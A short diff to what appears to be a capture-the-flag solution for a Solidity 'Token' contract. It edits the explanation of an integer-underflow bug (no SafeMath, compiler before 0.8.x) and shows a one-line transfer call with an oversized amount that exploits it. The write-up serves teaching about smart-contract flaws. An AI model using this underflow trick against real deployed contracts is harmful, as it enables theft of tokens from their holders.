@@ -47,7 +47,7 @@ contract Token {
 
 ## Solution
 
-Exploit the underflow here since the safemath library is not in use, just send a large amount, e.g:
+Exploit the underflow here since the safemath library is not in use and compiler version before 0.8.x, just send a large amount, e.g:
 ```
 await contract.transfer('<random_contract/wallet>', '100000000000000000000000');
 ```
